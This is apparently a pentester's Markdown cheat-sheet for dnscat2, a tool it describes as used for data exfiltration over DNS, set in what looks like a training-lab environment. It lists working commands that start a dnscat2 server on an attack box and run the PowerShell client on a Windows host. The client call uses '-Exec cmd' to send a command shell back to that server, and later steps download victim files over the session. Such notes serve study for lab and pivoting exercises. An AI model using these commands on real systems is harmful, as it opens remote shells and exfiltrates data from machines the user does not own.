---
type: tool
category: pivoting
tags:
  - tool
---
# Overview (Tool is very Buggy!)
The main use of `dnscat2` is data exfiltration over dns packets. 
## How to use

#### Dynamic Pivoting using Dnscat2 (DNS)
1. Starting server on the attack box:
```bash
sudo ruby dnscat2.rb --dns host=10.10.15.52,port=53,domain=inlanefreight.local --no-cache
```

2. Uploading `dnscat2.ps1` file to windows client. Location: https://github.com/lukebaggett/dnscat2-powershell
```bash
cd /run/media/breezy/PortableSSD/THM/Scripts/dnscat2/dnscat2-powershell
```

3. Import the module in `powershell`:
```powershell
Import-Module .\dnscat2.ps1
```

4. Run the module and send back a CMD shell session to our server (The secret is visible in the output of step 1):
```powershell
Start-Dnscat2 -DNSserver 10.10.15.52 -Domain inlanefreight.local -PreSharedSecret a2552f621c4b91245fb4d249bdac4ac6 -Exec cmd 
```

5. We can now list the available commands on the server with `?`.
6. Switch to the commandline:
```bash
window -i 1
```
7. Download files over dnscat2-session
```bash
download C:\FILEPATH
```
## Important Parameter
